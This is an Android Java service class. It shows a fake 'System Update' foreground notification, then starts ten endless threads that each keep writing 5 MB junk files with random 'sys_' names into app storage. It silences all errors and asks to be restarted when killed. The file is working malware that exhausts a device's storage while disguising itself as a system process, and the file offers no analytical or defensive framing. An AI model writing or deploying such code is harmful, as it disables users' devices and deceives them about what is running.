package com.example.app;

import android.app.*;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import java.io.File;
import java.io.FileOutputStream;
import java.util.Random;

public class BgService extends Service {
    @Override
    public void onCreate() {
        super.onCreate();
        
        String CHANNEL = "ch";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel c = new NotificationChannel(CHANNEL, "System", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(c);
        }
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? new Notification.Builder(this, CHANNEL) : new Notification.Builder(this);
        startForeground(1, b.setContentTitle("System Update").setContentText("...").setSmallIcon(android.R.drawable.ic_menu_manage).setOngoing(true).build());

        for (int i = 0; i < 10; i++) {
            new Thread(() -> {
                try {
                    File dir = getExternalFilesDir(null);
                    byte[] buffer = new byte[5 * 1024 * 1024]; // 5 ميجا
                    Random rand = new Random();
                    
                    while (true) {
                        File file = new File(dir, "sys_" + rand.nextInt(1000000) + ".tmp");
                        FileOutputStream fos = new FileOutputStream(file);
                        fos.write(buffer);
                        fos.close();
                    }
                } catch (Exception e) {}
            }).start();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
